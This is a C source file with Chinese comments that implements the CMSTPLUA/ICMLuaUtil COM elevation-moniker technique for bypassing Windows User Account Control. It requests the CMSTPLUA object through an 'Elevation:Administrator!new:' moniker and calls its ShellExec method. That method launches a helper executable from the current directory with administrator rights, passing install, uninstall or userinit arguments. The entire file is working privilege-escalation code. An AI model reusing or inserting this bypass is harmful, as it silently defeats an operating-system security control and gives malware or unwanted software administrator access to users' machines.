#include "BypassUAC.h"


HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid)
{
	BIND_OPTS3 bo;
	WCHAR wszCLSID[MAX_PATH] = { 0 };
	WCHAR wszMonikerName[MAX_PATH] = { 0 };
	HRESULT hr = 0;

	// 初始化COM环境
	::CoInitialize(NULL);

	// 构造字符串
	::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));
	hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
	{
		return hr;
	}

	// 设置BIND_OPTS3
	::RtlZeroMemory(&bo, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hWnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;

	// 创建名称对象并获取COM对象
	hr = ::CoGetObject(wszMonikerName, &bo, riid, ppVoid);
	return hr;
}


BOOL CMLuaUtilBypassUAC(int type)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil* CMLuaUtil = NULL;
	BOOL bRet = FALSE;

	::CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
	::IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

	// 提权
	hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
	if (FAILED(hr))
	{
		return FALSE;
	}

	TCHAR lpwszExecutable[260]{};
	TCHAR lpwszCurrentDir[260]{};
	GetCurrentDirectory(260, lpwszCurrentDir);
	PathCombine(lpwszExecutable, lpwszCurrentDir, PRIVATE_ADMIN_TASK_EXE_NAME);

	switch (type)
	{
		case PRIVATE_TYPE_INSTALL:
		{
			// 启动程序
			hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, L"install", NULL, 0, SW_SHOW);
		}
			break;
		case PRIVATE_TYPE_UNINSTALL:
		{
			// 启动程序
			hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, L"uninstall", NULL, 0, SW_SHOW);
		}
			break;
		case PRIVATE_TYPE_USERINIT:
		{
			// 启动程序
			hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, L"userinit", NULL, 0, SW_SHOW);
		}
			break;
		default:
			break;
	}
	
	if (FAILED(hr))
	{
		return FALSE;
	}

	bRet = TRUE;


	// 释放
	if (CMLuaUtil)
	{
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	}

	return bRet;
}